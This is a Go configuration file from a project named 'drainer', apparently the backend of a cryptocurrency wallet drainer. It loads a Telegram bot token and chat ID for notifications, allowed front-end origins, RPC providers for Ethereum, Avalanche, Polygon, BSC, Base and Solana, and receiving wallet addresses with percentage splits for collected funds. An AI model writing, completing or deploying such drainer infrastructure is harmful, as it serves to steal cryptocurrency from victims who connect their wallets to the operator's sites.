package config

import (
	"log"
	"os"

	"drainer/internal/model"
)

// Config regroupe toute la configuration chargée depuis l'environnement.
type Config struct {
	Port    string
	GinMode string

	TelegramToken  string
	TelegramChatID string

	AllowedOrigins []string

	EVMChains []model.ChainEvm
	SolChains []model.ChainSol
	EVMAddrs  []model.EvmAddress
	SolAddrs  []model.SolAddress
	PriceEth  []model.GetEthPrice
	PriceSol  []model.GetSolPrice
}

func Load() *Config {
	cfg := &Config{
		Port:    env("PORT", "8080"),
		GinMode: env("GIN_MODE", "release"),

		TelegramToken:  env("TELEGRAM_BOT_TOKEN", ""),
		TelegramChatID: env("TELEGRAM_CHAT_ID", ""),

		AllowedOrigins: []string{
			env("CORS_ORIGIN_1", ""),
			env("CORS_ORIGIN_2", ""),
		},

		EVMChains: []model.ChainEvm{
			{ID: "1", Provider: env("ETH_PROVIDER", "")},
			{ID: "43114", Provider: env("AVAX_PROVIDER", "")},
			{ID: "137", Provider: env("POLY_PROVIDER", "")},
			{ID: "56", Provider: env("BSC_PROVIDER", "")},
			{ID: "8453", Provider: env("BASE_PROVIDER", "")},
		},
		SolChains: []model.ChainSol{
			{SolProvider: env("SOL_PROVIDER", "")},
		},

		EVMAddrs: []model.EvmAddress{
			{ID: "1", EthAddress: env("EVM_ADDR_1", ""), Percent: 100},
		},
		SolAddrs: []model.SolAddress{
			{ID: "1", SolAddress: env("SOL_ADDR_1", ""), Percent: 60},
			{ID: "2", SolAddress: env("SOL_ADDR_2", ""), Percent: 40},
		},

		PriceEth: []model.GetEthPrice{
			{EthPrice: "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd"},
		},
		PriceSol: []model.GetSolPrice{
			{SolPrice: "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"},
		},
	}

	cfg.warn()
	return cfg
}

func (c *Config) warn() {
	if c.TelegramToken == "" {
		log.Println("WARNING: TELEGRAM_BOT_TOKEN non défini")
	}
	if c.TelegramChatID == "" {
		log.Println("WARNING: TELEGRAM_CHAT_ID non défini")
	}
}

func env(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}
